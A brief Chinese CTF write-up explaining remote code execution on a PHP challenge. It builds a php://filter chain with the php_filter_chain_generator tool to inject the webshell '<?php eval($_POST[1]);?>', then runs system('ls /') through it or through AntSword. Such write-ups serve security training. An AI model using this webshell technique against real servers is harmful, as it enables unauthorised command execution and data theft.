这也能rce？

题型:RCE-PHP伪协议
原WP又有点问题
出题师傅的笔记
PHP特性
这种题特征是
flag文件名未知，无法进行读取，只能rce
但是rce需要木马，服务器上又没有木马文件，攻击者又无法上传木马
因此需要构造一个filter伪协议链接来上传一句话木马
这里可以用到一个工具
GitHub - synacktiv/php_filter_chain_generator
以Linux为例
python3 php_filter_chain_generator.py --chain '<?php eval(\$_POST[1]);?>'
以Win为例
python php_filter_chain_generator.py --chain "<?php eval($_POST[1]);?>"
这样两个生成的filter链的base64是相同的

之后就是用get传参1，内容就是上面生成的链接
再之后用蚁剑或者post传参1=system('ls /');
来攻击都可以
